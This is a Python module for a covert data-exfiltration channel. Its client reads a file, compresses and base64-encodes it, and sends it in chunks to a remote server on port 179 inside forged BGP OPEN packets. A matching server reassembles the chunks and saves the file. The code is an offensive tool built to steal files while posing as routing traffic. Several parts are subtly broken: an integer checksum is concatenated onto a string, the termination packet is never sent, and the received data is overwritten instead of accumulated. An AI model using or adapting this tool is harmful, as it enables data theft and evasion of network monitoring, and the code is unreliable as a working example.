#!/usr/bin/python

import os
import sys
import time
import zlib
import socket
import base64

""" Constants """
BINARY_WRITE = "wb"
BINARY_READ = "rb"
NULL = "\x00"
COMP_LVL = 6
TRUE = 1

""" BGP Constants """
# This 1-octet unsigned integer indicates the type code of the message
MSG_OPEN = "\x01"
MSG_UPDATE = "\x02"
MSG_NOTIFICATION = "\x03"
MSG_KEEPALIVE = "\x04"

BGP_PORT = 179
BGP_VER = "\x04"

MIN_LENGTH_SIZE = "\x00\x1d"
MAX_LENGTH_SIZE = 4096

MARKER = (
    16 * "\xff"
)  # Marker This 16-octet field is included for compatibility; it MUST beset to all ones.

""" Temp Constants for testing"""
AS_NUM = "\xfe\x09"
HOLD_TIME = "\x00\xb4"  # 180
BGP_IDENT = "\xc0\xa8\x00\x0f"  # 192.168.0.15
MAGIC_2BYTE = "\xc0\xa8"  # Not mentioned in the RFC but Wireshark will display malformed packets without this.
MAGIC_BYTE = "\x0f"

""" Packet Creation Values """
DELIMITER = "\x12\x13\x14\x15"
INITIATOR = "\x01\x02\x03\x04"
PACK_INIT = "\x11\x11\x11\x11"
DATA_TERM = "finfin"
CONN_TERM = "kill_me_now"


def exfiltrator(server, path_to_file, time_delay=0.1):
    def create_bgp_packet():
        """
        Goddamn BGP giving me hard time creating a "valid" packet.
        This function should return a legitimate "OPEN" request.
        :return:
        """
        header = ""
        header += MARKER
        header += MIN_LENGTH_SIZE
        header += MSG_OPEN

        body = ""
        body += BGP_VER
        body += AS_NUM
        body += HOLD_TIME
        body += MAGIC_2BYTE + NULL + MAGIC_BYTE  # Go to "Constants" section
        body += NULL

        return header + body

    # Read file
    try:
        fh = open(path_to_file, BINARY_READ)
        exfil_me = fh.read()
        fh.close()
    except:
        sys.stderr.write("Problem with reading file. ")
        return -1

    checksum = zlib.crc32(exfil_me)  # Calculate CRC32 for later verification
    head, tail = os.path.split(path_to_file)  # Get filename

    exfil_me = zlib.compress(exfil_me, COMP_LVL)  # Compress data
    exfil_me = base64.b64encode(exfil_me)  # After checksum Base64 encode

    try:
        sock = socket.socket()
        sock.connect((server, BGP_PORT))
    except:
        sys.stderr.write("Could not open socket!\n")
        return -1

    bgp_packet = create_bgp_packet()  # Build the BGP OPEN request to work on

    """ Create initiation packet """
    msg = INITIATOR + DELIMITER + tail + DELIMITER + checksum + DATA_TERM
    sock.send(bgp_packet + msg)

    """ Start sending chunks """
    chunks = [
        exfil_me[i : i + MAX_LENGTH_SIZE]
        for i in range(0, len(exfil_me), MAX_LENGTH_SIZE)
    ]  # Split into chunks

    for chunk in chunks:
        msg = PACK_INIT + chunk + DATA_TERM
        try:
            sock.send(create_bgp_packet() + msg)
        except:
            try:
                sock = socket.socket()
                sock.connect((server, BGP_PORT))
                sock.send(create_bgp_packet() + msg)
            except:
                sys.stderr.write("Where did the damn server go?!\n")
                return -1

        time.sleep(time_delay)

    """ Send termination packet """
    term_msg = create_bgp_packet() + CONN_TERM + tail + DATA_TERM
    sock.close()


def server(addr="127.0.0.1"):

    data_in_prog = False

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_addr = (addr, BGP_PORT)
        sock.bind(server_addr)
        sys.stdout.write("Started listening at port %s at server %s" % server_addr)
    except:
        sys.stderr.write("Error binding to local socket. Probably taken or not root.\n")
        return -1

    sock.listen(TRUE)

    while True:
        sys.stdout.write("Listening for connections.")
        connection, client_address = sock.accept()
        try:
            sys.stdout.write("Incoming connection from %s\n" % client_address)
            while True:
                data = connection.recv()
                if data:
                    if data.find(INITIATOR) != -1:
                        # Found initiation packet!

                        sys.stdout.write(
                            "Got incoming initator from: %s \n" % client_address
                        )
                        # Extract filename
                        file_name_offset = data.find(DELIMITER) + len(DELIMITER)
                        data = data[file_name_offset:]
                        file_name = data[: data.find(DELIMITER)]

                        # Extract CRC:
                        crc = data[
                            data.find(DELIMITER) + len(DELIMITER) : data.find(DATA_TERM)
                        ]

                        sys.stdout(
                            "Getting file:\n\tFile Name:\t"
                            + file_name
                            + "\n\tCRC:\t"
                            + str(crc)
                            + "\n"
                        )

                        i = 0  # Zeroing chunks counter
                        entire_raw_file = ""  # Creating file space
                        data_in_prog = True  # Progress of file

                    elif (
                        data.find(DATA_TERM)
                        and data_in_prog is True
                        and data.find(CONN_TERM) == -1
                    ):
                        # Found regular data packet!
                        i += 1
                        entire_raw_file = data[
                            data.find(PACK_INIT) + len(PACK_INIT) : data.find(DATA_TERM)
                        ]

                    elif data.find(CONN_TERM) != -1:
                        # Got connection termination

                        # Check for CRC matching:
                        try:
                            entire_raw_file = base64.b64decode(entire_raw_file)
                        except:
                            sys.stderr.write(
                                "Error BASE64 decoding file.\nFile dropped.\n"
                            )
                            return -1

                        try:
                            entire_raw_file = zlib.decompress(entire_raw_file, COMP_LVL)
                        except:
                            sys.stderr.write(
                                "Error decompressing file!\nFile Dropped!\n"
                            )
                            return -1

                        if crc == str(zlib.crc32(entire_raw_file)):
                            sys.stdout.write("CRC matched!\n")

                            fh = open(crc + "_" + file_name, BINARY_WRITE)
                            fh.write(entire_raw_file)
                            fh.close()

                        else:
                            sys.stderr.write("CRC match failed!\n")

                else:
                    sys.stdout.write("No incoming data.\n")
        finally:
            connection.close()


if __name__ == "__main__":
    sys.stdout.write(
        "This is meant to be a module for python and not a stand alone executable\n"
    )
